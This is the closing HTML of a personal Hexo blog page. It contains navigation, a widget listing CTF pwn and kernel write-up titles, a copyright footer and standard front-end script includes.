    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/07/20/360dsctf2022-eznote/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/09/20/tctf2022ezvm/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/08/01/glibc-2-35%E4%B8%80%E4%BA%9B%E6%89%8B%E6%B3%95/" title="glibc-2.35一些手法">glibc-2.35一些手法</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/04/25/MRCTF-ezbash/" title="MRCTF_ezbash">MRCTF_ezbash</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/kernel/" title="In kernel">kernel</a>
</div>

    <span><a href="/2022/05/03/inctf2021-kqueue/" title="inctf2021_kqueue">inctf2021_kqueue</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/05/10/chunzhiIOT/" title="chunzhiIOT">chunzhiIOT</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/03/21/roarctf-2019-easypwn/" title="roarctf_2019_easypwn">roarctf_2019_easypwn</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/09/20/tctf2022ezvm/" title="tctf2022ezvm">tctf2022ezvm</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/03/20/buuoj-heapcreator/" title="buuoj_heapcreator">buuoj_heapcreator</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/06/20/ciscn-2022-planecoode/" title="ciscn_2022_planecoode">ciscn_2022_planecoode</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/begin/" title="In begin">begin</a>
</div>

    <span><a href="/2021/03/19/hello-world/" title="Hello World">Hello World</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/pwn/" title="In pwn">pwn</a>
</div>

    <span><a href="/2022/05/13/pwnable-re-alloc/" title="pwnable-re-alloc">pwnable-re-alloc</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">dreamcat @ dreamcat</span>
  </div>
  <div class="count">
    <span class="post-meta-item-icon">
      <i class="ic i-chart-area"></i>
    </span>
    <span title="Symbols count total">282k words</span>

    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="ic i-coffee"></i>
    </span>
    <span title="Reading time total">4:16</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/08/01/glibc-2-35一些手法/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)dreamcat?"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
